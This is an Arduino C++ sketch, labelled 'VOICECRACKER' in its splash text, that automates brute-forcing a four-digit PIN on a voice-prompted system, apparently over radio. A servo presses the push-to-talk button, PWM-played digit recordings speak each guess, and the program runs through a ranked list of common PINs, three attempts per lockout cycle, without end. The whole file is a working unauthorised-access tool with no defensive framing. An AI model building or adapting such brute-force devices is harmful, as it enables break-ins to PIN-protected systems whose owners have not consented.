#include <stdint.h>
#include <avr/interrupt.h>
#include <avr/io.h>
#include <avr/pgmspace.h>
#include <LiquidCrystal.h>

LiquidCrystal lcd(9, 10, 5, 4, 3, 2);

const short pincode_chunk = 1;
const short pincodes_rank[] PROGMEM = {1234,1111,0,1212,7777,1004,2000,4444,2222,6969,9999,3333,5555,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152,979};

/*
 * BEGIN AUDIO REGION
 * 
 */

#define SAMPLE_RATE 4200

const unsigned int voicedata_length[] = {1671,1579,1486,1486,1440,1950,1811,1486,1301,1764};

const unsigned char voicedata_data[][1950] PROGMEM = {
{127,128,128,127,128,127,128,127,127,127,128,128,128,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128,128},
{130,131,131,132,132,132,131,130,129,127,124,122,120,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126,126},
{128,127,128,127,127,127,127,127,127,127,127,127,127,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126,126},
{127,128,127,127,128,128,127,128,128,127,128,127,128,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128,128},
{127,122,121,127,127,130,131,130,131,129,129,131,130,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128,127},
{127,127,127,127,127,127,127,127,127,127,128,128,128,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127,127},
{125,128,127,129,130,130,128,131,129,127,130,128,129,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128,128},
{132,130,130,128,125,126,125,123,123,122,123,123,124,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119,120},
{129,127,120,118,116,119,123,129,136,140,148,139,136,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128,127},
{128,128,128,128,128,128,128,127,127,127,127,127,127,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126,127},
};

int speakerPin = 11; // Can be either 3 or 11, two PWM outputs connected to Timer 2
volatile uint16_t sample;
byte lastSample;
int voiceIndex;
bool playing;

void stopPlayback()
{
    TIMSK1 &= ~_BV(OCIE1A);
    TCCR1B &= ~_BV(CS10);
    TCCR2B &= ~_BV(CS10);
    digitalWrite(speakerPin, LOW);
    playing = false;
}

ISR(TIMER1_COMPA_vect) {
    if (sample >= voicedata_length[voiceIndex]) {
        if (sample == voicedata_length[voiceIndex] + lastSample) {
            stopPlayback();
        }
        else {
            OCR2A = voicedata_length[voiceIndex] + lastSample - sample;
        }
    }
    else {
        OCR2A = pgm_read_byte(&voicedata_data[voiceIndex][sample]);
    }

    ++sample;
}

void StartPlayback(int index)
{
    playing = true;
    pinMode(speakerPin, OUTPUT);
    voiceIndex = index;
    ASSR &= ~(_BV(EXCLK) | _BV(AS2));
    TCCR2A |= _BV(WGM21) | _BV(WGM20);
    TCCR2B &= ~_BV(WGM22);
    TCCR2A = (TCCR2A | _BV(COM2A1)) & ~_BV(COM2A0);
    TCCR2A &= ~(_BV(COM2B1) | _BV(COM2B0));
    TCCR2B = (TCCR2B & ~(_BV(CS12) | _BV(CS11))) | _BV(CS10);
    OCR2A = pgm_read_byte(&voicedata_data[voiceIndex][0]);
    cli();
    TCCR1B = (TCCR1B & ~_BV(WGM13)) | _BV(WGM12);
    TCCR1A = TCCR1A & ~(_BV(WGM11) | _BV(WGM10));
    TCCR1B = (TCCR1B & ~(_BV(CS12) | _BV(CS11))) | _BV(CS10);
    OCR1A = F_CPU / SAMPLE_RATE;
    TIMSK1 |= _BV(OCIE1A);
    lastSample = pgm_read_byte(&voicedata_data[voiceIndex][voicedata_length[voiceIndex]-1]);
    sample = 0;
    sei();
}

void PlayAudioIndex(int index) {
  StartPlayback(index);
  delay(voicedata_length[index] / (SAMPLE_RATE / 1000));
}

void PlayNumberSeq(short num, int spacing) { 
  //Get each digit
  short digits[4];
  digits[0] = (num/1000) % 10;
  digits[1] = (num/100) % 10;
  digits[2] = (num/10) % 10;
  digits[3] = (num/1) % 10;

  //Play each digit
  for(int i = 0; i<4; i++) {
    if(digits[i] < 0 || digits[i] > 9) {
      Serial.write("ERROR");
      continue;
    }
    PlayAudioIndex(digits[i]);
    delay(spacing);
  }
}

/* 
 *  END AUDIO REGION
 */

int pinCodeIndex = 0;

void SetServo(int delay) {
  for(int i = 0; i<10; i+=1) {
     digitalWrite(7, HIGH);
     delayMicroseconds(delay);
     digitalWrite(7, LOW);
     delayMicroseconds((25 * 1000) - delay); 
  }
}

void PressButton(int duration) {
  //Set status
  lcd.setCursor(0, 1);
  lcd.print("Pressing PTT... ");

  //Press
  SetServo(1 * 1000);
  delay(duration);
  SetServo(0.7 * 1000);
}

void setup()
{
    //Set up
    lcd.begin(16, 2);
    pinMode(7, OUTPUT);
    SetServo(0.7 * 1000); //Reset to default
        
    //Splash intro
    lcd.print("  VOICECRACKER");
    lcd.setCursor(0, 1);
    lcd.print("  By RomanPort");
    delay(1000);

    //Set up display
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Index 0-0");
    lcd.setCursor(6, 0);
    lcd.print(pincode_chunk);
    
    while(true) {
      DoEntireAction();
    }
}

void DoEntireAction() {
  //Hold down the button to trigger
  PressButton(1000);

  //Wait for the "system is locked" voice to finish
  lcd.setCursor(0, 1);
  lcd.print("Waiting prompt..");
  delay(5000);

  //Do attempts
  DoPasswordAttempt(1);
  DoPasswordAttempt(2);
  DoPasswordAttempt(3);
  SetAttemptLabel(0);

  //Wait for the bit to finish
  lcd.setCursor(0, 1);
  lcd.print("Waiting end...  ");
  delay(3000);
}

void SetAttemptLabel(int label) {
  lcd.setCursor(15, 0);
  lcd.print(label);
}

void DoPasswordAttempt(int attemptLabel) {
  //Update index
  lcd.setCursor(8, 0);
  lcd.print(pinCodeIndex);

  //Update attempt
  SetAttemptLabel(attemptLabel);

  //Press the button
  PressButton(1000);
  delay(300);
  
  //Read pin to use
  short buf = pgm_read_word(&pincodes_rank[pinCodeIndex]);

  //Write status
  lcd.setCursor(0, 1);
  lcd.print("Attempting      ");
  lcd.setCursor(11, 1);
  lcd.print((buf/1000) % 10);
  lcd.print((buf/100) % 10);
  lcd.print((buf/10) % 10);
  lcd.print((buf/1) % 10);

  //Write
  PlayNumberSeq(buf, 200);
  pinCodeIndex++;

  //Write status
  lcd.setCursor(0, 1);
  lcd.print("Waiting...      ");
  delay(7000);
}

void loop()
{
    
    while(true);
}
